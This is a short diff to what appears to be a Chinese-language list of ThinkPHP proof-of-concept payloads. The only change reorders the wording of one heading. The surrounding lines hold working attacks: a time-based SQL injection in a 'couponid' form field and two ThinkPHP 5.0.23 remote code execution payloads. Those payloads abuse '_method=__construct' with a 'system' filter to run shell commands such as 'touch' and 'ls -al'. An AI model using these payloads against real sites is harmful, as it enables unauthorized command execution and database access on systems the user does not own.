@@ -43,7 +43,7 @@ POC：</br>
 31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1</br>
     Content-Disposition: form-data; name="couponid"</br>
     1') union select sleep('''+str(sleep_time)+''')#</br>
-# thinkphp 5.0.23 debug模式（完整版）</br>
+# thinkphp 5.0.23（完整版）debug模式</br>
 32、(post)public/index.php (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx</br>
 # thinkphp 5.0.23(完整版)</br>
 33、（post）public/index.php?s=captcha (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al</rb>
